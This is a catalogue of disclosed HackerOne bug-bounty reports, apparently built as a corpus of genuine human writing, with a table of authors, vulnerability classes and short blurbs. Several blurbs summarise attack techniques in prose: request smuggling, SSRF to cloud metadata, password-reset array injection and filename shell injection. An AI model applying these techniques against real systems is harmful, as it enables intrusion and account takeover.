# HackerOne genuine-human report corpus

74 disclosed reports whose prose was fetched and classed as genuine human writing. Distinct authors: 70. Vuln classes: account-takeover / authentication-logic, stored-XSS via cache poisoning (HTTP request smuggling), authentication bypass / privilege escalation (SSO account takeover), account-takeover (leaked session cookie / staff privilege exposure), secrets exposure (leaked GitHub token), path traversal / arbitrary file read (escalated to RCE), Information disclosure via XSSI (cross-site script inclusion) token leak enabling PayPal account credential exposure, Critical RCE via stack-based buffer overflow in the Steam client's native UDP server-info (A2S_PLAYER) parser, Pre-auth RCE chain on Pulse Secure SSL VPN (arbitrary file read + 2FA bypass + post-auth command injection) demonstrated against Twitter's VPN, Unauthenticated exposed Kubernetes API leading to cluster-admin RCE and internal credential exposure, GraphQL authorization bypass exposing user PII and internal program/report metadata via the `nodes` connection field, Improper authentication / IDOR-style account takeover via OTP logout+login endpoints trusting a client-supplied user_id, account-takeover (password reset logic, CVE-2023-7028), HTTP request smuggling -> mass account-takeover, RCE via file upload (ImageMagick), info disclosure / narrative (WannaCry killswitch), SQL injection, subdomain takeover -> auth bypass, RCE via local websocket origin-check bypass (Electron nodeIntegration + no Origin validation) - PlayStation Now, smart-contract logic flaw (validation bypass) in MakerDAO's flip.kick auction contract, account-takeover (OIDC/AWS Cognito misconfig), account-takeover (OAuth token flaw), RCE via unsafe deserialization (GitHub import, CVE-2022-2884), Information Disclosure via GraphQL (private program data leak), Privilege Escalation — chained 5-vulnerability sandbox/kernel exploit chain (Blu-ray Disc Java 'bd-j' sandbox escape, PS4/PS5), H1 taxonomy: Privilege Escalation, Struct type confusion in mruby leading to instruction-pointer control / RCE primitive (Shopify Scripts mruby sandbox), H1 taxonomy: Code Injection, Insecure Direct Object Reference (IDOR) — unauthenticated/unauthorized deletion of another user's Snapchat Spotlight content via GraphQL mutation id substitution, H1 taxonomy: IDOR, Mass account takeover via IDOR in TaxJar's Accountant-Access/email-change flow (no victim interaction required), H1 taxonomy: Authentication Bypass Using an Alternate Path or Channel, Information Disclosure via GraphQL mutation (private email leak) — HackerOne's own SaveCollaboratorsMutation exposes a collaborator's email before they accept the invite, Account Takeover via Authentication Bypass in TikTok account recovery (Android), Information Disclosure (exposed production Grafana dashboards, Snapchat), Business Logic Flaw / Auth Bypass — 2FA-submission-requirement and reporter-blacklist bypass via embedded submission form, SSRF chained to GCP cloud-metadata theft and Kubernetes cluster RCE (Shopify Exchange), Command injection / RCE via bulk customer update (ImageTragick upload on Shopify's internal Kit CRM), Server-side template injection (Handlebars, Shopify Return Magic app) -> suspected code execution, Command injection (git flag/argument injection via API ref parameter) -> local file overwrite -> RCE, Improper access control (GitLab project-import feature injects an attacker-controlled service template that later projects auto-install, enabling exfil/mutation of repo+project data), Code injection (HTML injection bypassing CSP via area/map tags, chained to Electron BrowserWindow leak) -> Remote Code Execution in Slack desktop app, plus a bonus stored-XSS on files.slack.com, SSTI (Jinja2) -> RCE, Improper authentication (Digits origin-validation bypass) -> account takeover, Code injection -> privilege escalation on Windows nodes (CVE-2023-5528, in-tree storage plugin), Server-Side Template Injection (sign-up First Name field), SSRF via webhook redirect (HTTP 303) leading to AWS credential theft, SSRF (H1-2006 2020 CTF), SSRF via url= parameter, filter bypass using line-feed injection (%0A), SSRF via upload function (partial-content/range abuse) leading to GCP metadata token theft, OS command injection in Nextcloud 'Extract' app plugin leading to RCE (CVE-2019-5441), Prototype pollution -> Remote Code Execution (Elastic Kibana 7.6.2), Off-by-one memory corruption -> Remote Code Execution (Exim, CVE-2018-6789), SSTI (ERB, Rails UJS test server) -> Remote Code Execution, SSTI (lodash _.template) -> code execution, CVE-2021-23337, SSRF -> AWS instance metadata disclosure (DuckDuckGo proxy), SSRF -> EC2/OpenStack instance-metadata disclosure, Insecure file-type handling in avatar upload -> Ghostscript/ImageMagick RCE (CVE-2017-8291), SSRF via redirect-following URL-fetch template variable ('readapi') -> AWS EC2 metadata access, Insecure deserialization in Telerik UI RadAsyncUpload (CVE-2017-11317 / CVE-2019-18935) -> RCE, SSRF via image-import feature + DNS rebinding -> GCP instance-metadata / service-account token theft, Path traversal in package registry API -> arbitrary file write -> RCE via SSH key overwrite, Sawyer::Resource insecure deserialization (via Octokit GitHub import) -> Redis command injection -> RCE, Python pickle deserialization (Liberapay notifications) chained with SQL injection -> RCE, DotNetNuke DNNPersonalization cookie XML/type deserialization (CVE-2017-9822) -> RCE, Server-side template injection (Smarty) via profile fields -> PHP code execution -> RCE, IDOR on HackerOne's own AddTagToAssets GraphQL mutation, IDOR (Insecure Direct Object Reference) — GitLab ML Model Registry, incremental/guessable model IDs exposing private models, IDOR (session misbinding) — Mozilla Firefox Accounts /account/destroy lets an attacker delete a victim's account by supplying their email+authPW hash under the attacker's own session, IDOR — Bykea legacy/'zombie' in-app endpoint leaking other users' trip and driver details without ownership validation, IDOR — HackerOne's own /bugs.json endpoint let any authenticated user pull private report metadata (title, id, state, severity, reporter) for an arbitrary organization by ID, IDOR (fraud / free-order) — Yelp/Grubhub checkout endpoint let an attacker substitute another user's credit_card_id to pay with their saved card, IDOR leading to account takeover — Automattic/Atavist email-change endpoint trusted a client-supplied sequential user id parameter, letting anyone change any account's email then reset the password, Account takeover (0-click, password reset), Account takeover (SCIM provisioning), Account takeover (SAML RelayState/CSRF), Account takeover (2FA linking bypass), Account takeover (stale verification token).

## Summary table

| # | Report | Author | Class | Signal | Access | Lang | Stands out |
|---|---|---|---|---|---|---|---|
| 1 | [867513](https://hackerone.com/reports/867513) | francisbeaudoin | account-takeover / authentication-logic | strong | direct | genuine | A meticulously documented multi-stage account-takeover chain (email-verification bypass chained into an SSO account merge) with an attached PoC video, escalated cordially with Shopify's own triager through to a $22,500 payout plus a later personal thank-you bonus. |
| 2 | [510152](https://hackerone.com/reports/510152) | albinowax | stored-XSS via cache poisoning (HTTP request smuggling) | weak | direct | genuine | The report that seeded James Kettle's (albinowax) industry-defining 'HTTP Desync Attacks: Request Smuggling Reborn' research — notable for its brevity: the entire body is one sentence pointing offsite rather than restating detail in the report. |
| 3 | [791775](https://hackerone.com/reports/791775) | ngalog | authentication bypass / privilege escalation (SSO account takeover) | strong | direct | nonnative | A cheerfully narrated email-confirmation-bypass-to-SSO-takeover chain ('grab a coffee, sit back and relax... watch some YouTube videos') from a researcher who negotiated two separate bounties after Shopify found the bug had two root causes. |
| 4 | [745324](https://hackerone.com/reports/745324) | Haxta4ok00 | account-takeover (leaked session cookie / staff privilege exposure) | strong | direct | nonnative | HackerOne's own critical-severity incident report — haxta4ok00's genuinely broken-English narration of stumbling into staff-level platform access sits directly beside HackerOne's own exhaustive corporate post-mortem, a striking voice contrast within one report. |
| 5 | [1087489](https://hackerone.com/reports/1087489) | augustozanellato | secrets exposure (leaked GitHub token) | strong | direct | genuine | A $50,000 'accidental' find — augustozanellato's breezy, self-deprecating narration of stumbling on a fully-privileged Shopify GitHub token while reverse-engineering an unrelated Electron app's .env file. |
| 6 | [827052](https://hackerone.com/reports/827052) | vakzz | path traversal / arbitrary file read (escalated to RCE) | strong | direct | genuine | vakzz's report escalates mid-thread from a clean directory-traversal file read into a fully weaponized Ruby Marshal-cookie RCE chain against GitLab, complete with working exploit code, closing each technical escalation with a casual 'Cheers,\nWill' sign-off. |
| 7 | [739737](https://hackerone.com/reports/739737) | alexbirsan | Information disclosure via XSSI (cross-site script inclusion) token leak enabling PayPal account credential exposure |  | direct | genuine | One of the most famous PayPal bug bounty reports ever, later written up publicly by Alex Birsan as 'The Bug That Exposed Your PayPal Password'; the H1 page itself is content-redacted, so the only disclosed prose is PayPal's own incident summary. |
| 8 | [470520](https://hackerone.com/reports/470520) | vinnievan | Critical RCE via stack-based buffer overflow in the Steam client's native UDP server-info (A2S_PLAYER) parser |  | direct | genuine | A fully public, deeply technical exploit-engineering writeup — includes raw exploit Python source, a unicode ROP chain built entirely from Steam.exe gadgets, ASLR-bypass probability math, and PoC videos, all still visible in the disclosed report body. |
| 9 | [591295](https://hackerone.com/reports/591295) | orange | Pre-auth RCE chain on Pulse Secure SSL VPN (arbitrary file read + 2FA bypass + post-auth command injection) demonstrated against Twitter's VPN |  | direct | nonnative | Orange Tsai's landmark Pulse Secure SSL VPN research (the basis of his Black Hat USA 2019 talk 'Infiltrating Corporate Intranet Like NSA'), using Twitter's unpatched VPN as the real-world case study; the disclosed page still shows the original heavy black-bar redactions over credentials and screenshots. |
| 10 | [455645](https://hackerone.com/reports/455645) | txt3rob | Unauthenticated exposed Kubernetes API leading to cluster-admin RCE and internal credential exposure |  | direct | genuine | Shows report length has no bearing on severity — a two-sentence bug description, found via a mass internet scan with binaryedge.io, earned a $25,000 bounty for unauthenticated cluster-admin access to Snapchat's internal Kubernetes API. |
| 11 | [489146](https://hackerone.com/reports/489146) | yashrs | GraphQL authorization bypass exposing user PII and internal program/report metadata via the `nodes` connection field |  | direct | genuine | A self-referential case: HackerOne's own GraphQL API leaked user PII, and the company's co-founder wrote one of the most detailed, engineering-transparent public postmortems in H1 history — full root-cause analysis, timeline table, and per-field impact tables. |
| 12 | [921780](https://hackerone.com/reports/921780) | korniltsev | Improper authentication / IDOR-style account takeover via OTP logout+login endpoints trusting a client-supplied user_id |  | direct | nonnative | A minimal, request/response-driven IDOR-style report — attacker/victim user_id confusion in Snapchat's OTP logout+login flow lets anyone log in as any user, demonstrated with raw (redacted) HTTP traffic rather than prose. |
| 13 | [2293343](https://hackerone.com/reports/2293343) | asterion04 | account-takeover (password reset logic, CVE-2023-7028) | Password-reset endpoint accepted a JSON array of two email addresses in place of a single string; both the victim's mailbox and the attacker's mailbox received the same reset token/link, letting the attacker complete the reset. | direct | nonnative | A CVE-worthy (CVE-2023-7028) account takeover reduced to a single JSON-array substitution in the password-reset request, disclosed with a $35,000 bounty and 939 upvotes. |
| 14 | [737140](https://hackerone.com/reports/737140) | defparam | HTTP request smuggling -> mass account-takeover | Malformed 'Transfer-Encoding' header (space inserted before the colon) causes front-end/back-end disagreement on request framing (CL.TE desync); attacker splices a forged request that hijacks the next real user's connection and captures their session cookie via a forced open-redirect to attacker infrastructure (Burp Collaborator). | direct | genuine | A self-described first-time HackerOne submitter's warm, conversational report walks through a full CL.TE smuggling chain to mass session-cookie theft, becoming one of the platform's most-upvoted reports (866 votes). |
| 15 | [403417](https://hackerone.com/reports/403417) | fransrosen | RCE via file upload (ImageMagick) | Unpatched ImageMagick PostScript delegate invoked Ghostscript's %pipe% output device on an uploaded logo 'image', achieving arbitrary OS command execution during processing. | direct | genuine | fransrosen's live RCE transcript is preserved with HackerOne's own redaction blocks (███) still visible over sensitive server output, giving the report the texture of a raw terminal session rather than a cleaned-up write-up. |
| 16 | [228648](https://hackerone.com/reports/228648) | malwaretech | info disclosure / narrative (WannaCry killswitch) | WannaCry queried an unregistered domain before encrypting files as an anti-analysis/anti-sandbox check; registering that domain flipped the conditional check and halted further propagation of that malware sample. | direct | genuine | Unusually, the disclosed report body itself is not MalwareTech's own submission text but a third-person case-study summary written by HackerOne staff, which then points out to his personal blog as the 'original disclosure.' |
| 17 | [531051](https://hackerone.com/reports/531051) | spaceraccoon | SQL injection | XML-based file-upload endpoint backed by Microsoft Dynamics AX allowed HTML-entity-encoded SQL injection in a numeric-looking 'MainAccount' field; confirmed as time-based via sqlmap with --tamper htmlencode, exposing enterprise accounting/financial data. | direct | genuine | spaceraccoon's report reads like a short story (False Starts / Lightbulb Moment / Assessing Impact / Takeaways) culminating in extracting Starbucks' Dynamics AX accounting database via SQLi hidden behind an XML file-upload form. |
| 18 | [335330](https://hackerone.com/reports/335330) | geekboy | subdomain takeover -> auth bypass | Dangling CNAME to an unclaimed HubSpot instance let anyone claim devrel.roblox.com, which shared Roblox's .ROBLOSECURITY cookie scope and was CORS-whitelisted against chat.roblox.com, enabling cookie theft and private chat reads. | direct | nonnative | A subdomain takeover of devrel.roblox.com is escalated step by step into cookie theft, CORS-based private chat reading, and phishing, reported in clearly non-native but understandable English. |
| 19 | [873614](https://hackerone.com/reports/873614) | parsiya | RCE via local websocket origin-check bypass (Electron nodeIntegration + no Origin validation) - PlayStation Now | exemplary voice-rich technical writeup: personal narrative, self-deprecating humor, first-person walkthrough of chaining 3 issues (origin bypass -> nodeIntegration -> arbitrary URL load) into RCE | direct | genuine | Reads like a personal blog post rather than a corporate report — first-person, self-aware humor ('WOW!', 'you deserve a calc popping gif'), a running Raymond-Chen 'airtight hatchway' joke used as both technical framing and punchline, plus a full narrated methodology (Burp proxying, user-agent identification, websocket message reverse engineering) rather than a terse bug template. |
| 20 | [684092](https://hackerone.com/reports/684092) | lucash-dev | smart-contract logic flaw (validation bypass) in MakerDAO's flip.kick auction contract | Critical-severity DeFi validation-bypass with an attached working Solidity PoC test; 466 upvotes; program makerdao_bbp. | direct (hackerone.com/reports/684092.json public report-detail API endpoint, returns full disclosed report JSON incl. vulnerability_information body) | genuine | A rigorous smart-contract report that traces a missing access-control check in flip.kick through a precise 3-step exploit chain (fake auction -> free DAI mint via end.skip -> collateral redemption) to a complete drain of MakerDAO's vault, with a reproducing Solidity test attached. |
| 21 | [1342088](https://hackerone.com/reports/1342088) | lauritz | account-takeover (OIDC/AWS Cognito misconfig) | Critical ATO chaining an undocumented IdP-level API bypass with an email-normalization/case-sensitivity collision; 437 upvotes; program flickr, disclosed 2021-12-18. | direct (hackerone.com/reports/1342088.json public report-detail API endpoint) | genuine | Rather than fighting Flickr's UI restriction on changing account email, the researcher goes straight to the underlying AWS Cognito User Pool API to alter the attribute directly, then exploits a case-sensitivity/verification gap in Flickr's login flow to complete the takeover with zero victim interaction. |
| 22 | [314808](https://hackerone.com/reports/314808) | sandeep_hodkasia | account-takeover (OAuth token flaw) | High-severity OAuth token-confusion ATO disclosed via a single vulnerable request replay; program reverb, disclosed 2020-03-19. | direct (hackerone.com/reports/314808.json public report-detail API endpoint) | nonnative | An unusually short, blunt report (basically one replayed POST request) that still fully qualifies as a High severity account takeover because Reverb's iOS backend accepted any valid Facebook access_token without checking it was issued to Reverb's own app — impact, not writeup length, drove the severity. |
| 23 | [1679624](https://hackerone.com/reports/1679624) | vakzz | RCE via unsafe deserialization (GitHub import, CVE-2022-2884) | Critical unauthenticated RCE bypassing a prior patch for CVE-2022-2884; $33,510 bounty ('formatted_bounty'), 384 upvotes, program gitlab, disclosed 2022-10-06. Note: the report's own cve_ids field lists CVE-2022-2884, not CVE-2022-2992 as given in the candidate brief — worth flagging as a possible ID mix-up in the source list. | direct (hackerone.com/reports/1679624.json public report-detail API endpoint) | genuine | An advanced, source-line-annotated exploit chain (GitHub-import Sawyer::Resource method override -> Redis RESP protocol injection -> Marshal.load deserialization gadget -> RCE) backed by full reproduction scripts, an ngrok-based fake server, and captured GitLab server logs/stack traces as evidence. |
| 24 | [1618347](https://hackerone.com/reports/1618347) | haxta4ok00 | Information Disclosure via GraphQL (private program data leak) | Critical unauthenticated cross-tenant info disclosure on HackerOne's own GraphQL API; $25,000 bounty, 285 upvotes, program 'security' (HackerOne itself), disclosed 2025-01-21. | direct (hackerone.com/reports/1618347.json public report-detail API endpoint) | nonnative | One of the shortest writeups imaginable for a $25,000 critical bounty: three brief, grammatically loose sentences plus a single GraphQL query/response pair were enough to prove that raw global-id enumeration on a `node(id:...)` query leaked private bug-bounty program names and asset scope to unauthenticated users. |
| 25 | [1379975](https://hackerone.com/reports/1379975) | theflow0 | Privilege Escalation — chained 5-vulnerability sandbox/kernel exploit chain (Blu-ray Disc Java 'bd-j' sandbox escape, PS4/PS5), H1 taxonomy: Privilege Escalation |  | direct | genuine | Full root-caused write-up (decompiled Java/C snippets per vuln, offsets, working bd-jb.iso PoC) for a 5-bug PS4/PS5 Blu-ray-disc Java sandbox escape chain; $20,000 bounty, 296 upvotes; note the body is stored under the 'team'-category disclosure summary (account 'sazerac', company type) yet reads entirely as the researcher's own first-person submission addressed to PlayStation. |
| 26 | [181879](https://hackerone.com/reports/181879) | h72 | Struct type confusion in mruby leading to instruction-pointer control / RCE primitive (Shopify Scripts mruby sandbox), H1 taxonomy: Code Injection |  | direct | genuine | IMPORTANT DISCREPANCY: the task listed the author as saelo (Samuel Gross), but the report's actual HackerOne reporter field is 'h72', not saelo — I could not verify these are the same person. The body's real sign-off name is HackerOne-redacted (███████), which is consistent with (but does not confirm) a real-name signature being scrubbed. Otherwise notable for extreme economy: a critical ($18,000 bounty) type-confusion RCE primitive in Shopify's mruby sandbox described in under 150 words, disclosed 2016-12-17. |
| 27 | [1819832](https://hackerone.com/reports/1819832) | prickn9 | Insecure Direct Object Reference (IDOR) — unauthenticated/unauthorized deletion of another user's Snapchat Spotlight content via GraphQL mutation id substitution, H1 taxonomy: IDOR |  | direct | nonnative | A textbook example that severity/impact and prose polish are decoupled: broken/non-native English describing a genuinely critical, one-parameter IDOR (swap a GraphQL mutation's video id) that could delete any public creator's Spotlight video — high bounty ($15,000) and very high community upvotes (789) despite the writing quality. |
| 28 | [1685970](https://hackerone.com/reports/1685970) | mr_asg | Mass account takeover via IDOR in TaxJar's Accountant-Access/email-change flow (no victim interaction required), H1 taxonomy: Authentication Bypass Using an Alternate Path or Channel |  | direct | nonnative | Clean minimal-primitive IDOR (swap an account-number path segment + inject an email field) automated into a Python loop for true mass account takeover with zero victim interaction on a Stripe-owned payments/tax product; $13,000 bounty, 209 upvotes, disclosed 2022-10-19; researcher also links their own external Medium write-up for the full narrative. |
| 29 | [2032716](https://hackerone.com/reports/2032716) | 0xrayan1996 | Information Disclosure via GraphQL mutation (private email leak) — HackerOne's own SaveCollaboratorsMutation exposes a collaborator's email before they accept the invite | Information Disclosure | direct | nonnative | Finds a PII leak inside HackerOne's own collaborator-invite GraphQL flow, revealing a hacker's private email before they've even accepted the report invitation — a notable case of the disclosure platform itself leaking researcher PII. |
| 30 | [2443228](https://hackerone.com/reports/2443228) | xtt0k (current H1 handle: fl4w) | Account Takeover via Authentication Bypass in TikTok account recovery (Android) | Authentication Bypass Using an Alternate Path or Channel | direct | genuine | This is a 'no-content' singular disclosure: TikTok never published the full report body, only a two-paragraph team summary plus the researcher's own one-paragraph recap — a clean example of how much (or little) some programs choose to make public even for a $12k critical ATO. |
| 31 | [663628](https://hackerone.com/reports/663628) | damian89 | Information Disclosure (exposed production Grafana dashboards, Snapchat) | Information Disclosure | direct | nonnative | Another 'no-content' singular disclosure — only the compact team acknowledgment and the researcher's own two-sentence recap were ever made public, with the actual steps, screenshots, and the mentioned SQL injection detail permanently redacted. |
| 32 | [418767](https://hackerone.com/reports/418767) | japz (Japz Divino / pinoywhitehat) | Business Logic Flaw / Auth Bypass — 2FA-submission-requirement and reporter-blacklist bypass via embedded submission form | Improper Authorization | direct | nonnative | A clean, simple authorization-bypass find — a program's enforced 2FA submission requirement (and reporter blocklist) is trivially routed around via the same program's own embedded submission form — written in a plain, friendly, conversational tone. |
| 33 | [341876](https://hackerone.com/reports/341876) | 0xacb | SSRF chained to GCP cloud-metadata theft and Kubernetes cluster RCE (Shopify Exchange) | Server-Side Request Forgery (SSRF) | direct | genuine | One of the most-cited HackerOne reports ever written: a single SSRF into GCP instance metadata is pivoted step by step into a stolen kube-env, a Kubelet client cert, and finally an interactive root shell inside Shopify's Kubernetes cluster — a textbook chained cloud-to-RCE writeup with full command transcripts at every step. |
| 34 | [422944](https://hackerone.com/reports/422944) | fransrosen | Command injection / RCE via bulk customer update (ImageTragick upload on Shopify's internal Kit CRM) | Command Injection - Generic | direct | genuine | A very concrete file-upload-to-RCE chain (disguised PostScript exploiting the ImageTragick/Ghostscript bug in an image-upload check) with an actual reverse-shell transcript and an internal README leak that independently confirms the box belonged to Shopify's internal Kit CRM system. |
| 35 | [423541](https://hackerone.com/reports/423541) | zombiehelp54 | Server-side template injection (Handlebars, Shopify Return Magic app) -> suspected code execution | self-doubting discovery voice; real Node.js SSTI understated with humor instead of oversold | direct | genuine | Reads as a live, uncertain discovery in progress rather than a polished exploit writeup - the reporter flags his own uncertainty about exploitability twice and still ends the Impact section with a shrug emoticon instead of a confident claim. |
| 36 | [658013](https://hackerone.com/reports/658013) | vakzz | Command injection (git flag/argument injection via API ref parameter) -> local file overwrite -> RCE | terse infra-first PoC report that mirrors GitLab's own bug-report template phrasing | direct | genuine | Almost entirely command-output driven with near-zero narrative flourish, and it deliberately borrows GitLab's own 'What is the current bug behavior? / What is the expected correct behavior?' issue-template phrasing, showing the reporter tailored the writeup format to the target's own internal conventions for fast triage. |
| 37 | [446585](https://hackerone.com/reports/446585) | jobert | Improper access control (GitLab project-import feature injects an attacker-controlled service template that later projects auto-install, enabling exfil/mutation of repo+project data) | methodical multi-vector impact enumeration with explicit unconfirmed/ethical self-limiting caveats | direct | genuine | Rather than chasing maximum shock value, the reporter enumerates multiple attack strategies (email exfil, hidden CI services, chat-integration mutation, URL hijack) and explicitly labels one path 'Unconfirmed' because testing it further on gitlab.com would have required creating a real Slack integration he wasn't comfortable spinning up against production. |
| 38 | [783877](https://hackerone.com/reports/783877) | oskarsv | Code injection (HTML injection bypassing CSP via area/map tags, chained to Electron BrowserWindow leak) -> Remote Code Execution in Slack desktop app, plus a bonus stored-XSS on files.slack.com | narrative full-chain exploit writeup with TL;DR summary and candid scope-hedged bonus finding | direct | genuine | Combines a genuinely novel multi-stage exploit chain (CSP-evading HTML injection -> Electron object leak -> arbitrary command execution) with a hacker-culture TL;DR bullet summary and a candid, self-hedged disclosure of a second, likely-out-of-scope bug ('it seems the domain is out of scope (?)') that the author reports anyway purely because he judges it critical. |
| 39 | [125980](https://hackerone.com/reports/125980) | orange | SSTI (Jinja2) -> RCE | genuine unpolished human voice (typos: "filed"/"bellow"); useful positive exemplar for human-vs-templated writeup calibration | direct | nonnative | Reads like a casual chat message complete with a sign-off emoticon, yet casually walks through a full Jinja2 sandbox-escape payload chain -- a striking contrast between breezy tone and high-severity RCE content. |
| 40 | [129873](https://hackerone.com/reports/129873) | filedescriptor | Improper authentication (Digits origin-validation bypass) -> account takeover | highly fluent, self-structured technical writeup; strong exemplar of a publication-quality human report body | direct | genuine | A near publication-ready mini advisory embedded directly in the report field: markdown headers, an inline vulnerable JS snippet, a precise root-cause explanation (regex coercion in String.prototype.search), a password-protected PoC video, and a one-line proposed fix. |
| 41 | [2231019](https://hackerone.com/reports/2231019) | tomerpeled92 | Code injection -> privilege escalation on Windows nodes (CVE-2023-5528, in-tree storage plugin) | terse, back-channel-quoting report; illustrates the 'imported from email' report pattern rather than a self-contained narrative | direct | genuine | Explicitly labeled as an 'imported report' that pastes raw excerpts of an out-of-band email exchange with the Kubernetes security team, including their own bounty-tier confirmation, rather than narrating the vulnerability independently. |
| 42 | [1104349](https://hackerone.com/reports/1104349) | battle_angel | Server-Side Template Injection (sign-up First Name field) | SSTI payload placed in a profile field gets rendered server-side later, in an out-of-band channel (the welcome email subject line) rather than the HTTP response — classic delayed/blind SSTI. | direct | genuine | Turns a routine sign-up field into blind SSTI proof by watching the payload get evaluated in an unrelated channel (the email subject line), and the author is candid about a side effect that broke their own test account. |
| 43 | [508459](https://hackerone.com/reports/508459) | honoki | SSRF via webhook redirect (HTTP 303) leading to AWS credential theft | Redirect-following bypass: the app blocks direct SSRF targets but blindly follows a 303 See Other from an attacker-controlled webhook endpoint straight to the cloud metadata service. | direct | genuine | Cleanly isolates the exact status-code edge case (303, not 301/302) that slips past the redirect filter, with a minimal one-line PHP repro and a direct path to IAM credential theft. |
| 44 | [887766](https://hackerone.com/reports/887766) | silentecho_ | SSRF (H1-2006 2020 CTF) | n/a — report body never contains the actual technique, only a flag submission with a promise to add a writeup later. | direct | genuine | Despite the title, this is not actually a writeup — the disclosed body is just a flag placeholder and an emoji-punctuated promise ('Will soon submit Writeup :)') that was apparently never fulfilled in the report itself; confirmed by re-fetching the report page, which contains no additional writeup text beyond this. |
| 45 | [514224](https://hackerone.com/reports/514224) | niwasaki | SSRF via url= parameter, filter bypass using line-feed injection (%0A) | Blind SSRF confirmed purely via response-time side channel (open vs closed vs filtered internal ports), then used to fingerprint the AWS metadata service through a differential-response oracle rather than direct data exfiltration. | direct | nonnative | Builds a full blind-SSRF oracle out of nothing but response timing and an 'Unable to retrieve' vs empty-body distinction, methodically walking from a closed port, to an open port, to confirming a real AWS metadata path exists — all without ever seeing the actual response body. |
| 46 | [549882](https://hackerone.com/reports/549882) | dphoeniixx | SSRF via upload function (partial-content/range abuse) leading to GCP metadata token theft | Abuses HTTP Range/Content-Range partial-transfer semantics: server under-delivers the declared byte count so the backend re-requests the remainder, and that follow-up request is redirected to the cloud metadata endpoint. | mirror | nonnative | The HackerOne report body itself is redacted (visibility:no-content) — the actual disclosed technical narrative lives only in the researcher's linked Medium post, which the report's own researcher-summary comment points to; it is a genuinely joyful, diagram-driven discovery story ('Cool!', 'SURPRISE!', hand-drawn attack diagrams) built around a subtle range-request under-delivery trick, ending in a GCP service-account token. |
| 47 | [546753](https://hackerone.com/reports/546753) | hdbreaker | OS command injection in Nextcloud 'Extract' app plugin leading to RCE (CVE-2019-5441) | Unsanitized filename parameter passed straight into a shell exec() (unrar x "$file" ...) fallback path used only when the PHP rar extension isn't loaded — a classic shell-metacharacter injection via an uploaded/renamed archive filename. | direct | nonnative | Full end-to-end weaponization on a live public demo instance (demo.nextcloud.com) — drops a Perl reverse shell via a first crafted filename, triggers it with a second request, and reads the live config.php — with actual attacker-server IP left in the report and a polite, slightly formal non-native sign-off. |
| 48 | [852613](https://hackerone.com/reports/852613) | alexbrasetvik | Prototype pollution -> Remote Code Execution (Elastic Kibana 7.6.2) |  | direct | genuine | A vivid, technically dense walkthrough of turning a prototype-pollution telemetry bug into shell RCE on Elastic Cloud, wrapped in genuinely warm back-and-forth with Elastic staff who invented an on-the-spot bonus ("Elastic It To The Man") to reward the find. |
| 49 | [322935](https://hackerone.com/reports/322935) | mehqq | Off-by-one memory corruption -> Remote Code Execution (Exim, CVE-2018-6789) |  | direct | nonnative | A strikingly terse, self-effacing report that outsources all technical depth to an external blog post and simply asks whether the finding is even bounty-eligible — a useful contrast to over-explained reports. |
| 50 | [942103](https://hackerone.com/reports/942103) | ooooooo_q | SSTI (ERB, Rails UJS test server) -> Remote Code Execution |  | direct | nonnative | An honest, low-drama disclosure where the researcher proactively downplays their own RCE's severity because the vulnerable code is test-only, and the report is ultimately closed with zero bounty despite full command execution — a good example of researcher integrity over reward-maximizing. |
| 51 | [904672](https://hackerone.com/reports/904672) | zerohex | SSTI (lodash _.template) -> code execution, CVE-2021-23337 |  | direct | genuine | A remarkable redemption arc: the report was closed as "Informative" (not a bug) with the researcher apologizing for "wasting your time," only for the exact issue to be confirmed roughly eight months later as CVE-2021-23337, vindicating the original finding. |
| 52 | [395521](https://hackerone.com/reports/395521) | cujanovic | SSRF -> AWS instance metadata disclosure (DuckDuckGo proxy) |  | direct | genuine | Proof that a Critical-severity SSRF doesn't need a long writeup: the entire technical substance is one sentence plus a single curl command and its raw metadata-server output, plus an ethically framed note that the endpoint was technically "out of scope" but reported anyway due to severity. |
| 53 | [53088](https://hackerone.com/reports/53088) | agarri_fr | SSRF -> EC2/OpenStack instance-metadata disclosure | Closed/Resolved, $300 bounty; reframes a dismissed low-impact SSRF as a cloud-metadata exposure vector | direct | nonnative | One of the earliest public HackerOne write-ups to escalate a vendor-dismissed SSRF into a cloud-metadata takeover, a pattern that later became a canonical SSRF bug class. |
| 54 | [365271](https://hackerone.com/reports/365271) | gammarex | Insecure file-type handling in avatar upload -> Ghostscript/ImageMagick RCE (CVE-2017-8291) | Resolved, $5,000 bounty, CVE-2017-8291 assigned, 415 upvotes — one of the highest-voted reports in this set | direct | genuine | Extraordinary information density: the full root-cause chain (upload validation gap -> magic-byte confusion -> Ghostscript CVE) plus PoC and remediation delivered in well under 100 words. |
| 55 | [1108418](https://hackerone.com/reports/1108418) | nrockhouse | SSRF via redirect-following URL-fetch template variable ('readapi') -> AWS EC2 metadata access | Resolved, $200 bounty, 41 upvotes; note the researcher's own text lives in the report's 'researcher summary' field, not the main vulnerability_information field | direct | genuine | Unusually methodical: documents every WAF-like caveat (protocol check, content-type filter, timeout, length limit, brace-filtering) before finding the redirect bypass, and is transparent about where escalation stalled. |
| 56 | [1174185](https://hackerone.com/reports/1174185) | z32 | Insecure deserialization in Telerik UI RadAsyncUpload (CVE-2017-11317 / CVE-2019-18935) -> RCE | Resolved, no bounty listed, 27 upvotes, two CVEs cited; report body is redacted (████) for target-specific host/path/version details per program disclosure rules | direct | genuine | A rare timestamped, in-progress working note left inside a formal disclosure — genuine real-time research rather than a cleaned-up narrative. |
| 57 | [530974](https://hackerone.com/reports/530974) | nahamsec | SSRF via image-import feature + DNS rebinding -> GCP instance-metadata / service-account token theft | Resolved, 417 upvotes (one of the most-voted reports here); team summary credits co-researchers @daeken and @ziot | direct | genuine | Pairs an informal, conversational tone with a complete working DNS-rebinding PoC (timing-based Flask server + rebind script) reaching real GCP metadata secrets — casual voice, serious impact. |
| 58 | [733072](https://hackerone.com/reports/733072) | saltyyolk | Path traversal in package registry API -> arbitrary file write -> RCE via SSH key overwrite | Verified, chained artifact from HackerOne's own storage; grammar quirks ('did't', subject-verb slips) mark it as clearly human, non-native English, not templated. | direct | nonnative |  |
| 59 | [1672388](https://hackerone.com/reports/1672388) | yvvdwf | Sawyer::Resource insecure deserialization (via Octokit GitHub import) -> Redis command injection -> RCE | Deep, first-principles chain from a Ruby gem quirk (Sawyer::Resource) to Redis protocol injection to RCE gadget, narrated with visible in-the-moment ethical restraint against a live production target. | direct | genuine |  |
| 60 | [361341](https://hackerone.com/reports/361341) | kapytein | Python pickle deserialization (Liberapay notifications) chained with SQL injection -> RCE | Honest, partially-blocked exploit chain (pickle deserialization gated behind a SQL injection the researcher can't fully trigger) reported in good faith rather than oversold; resolved by the vendor migrating off pickle entirely. | direct | genuine |  |
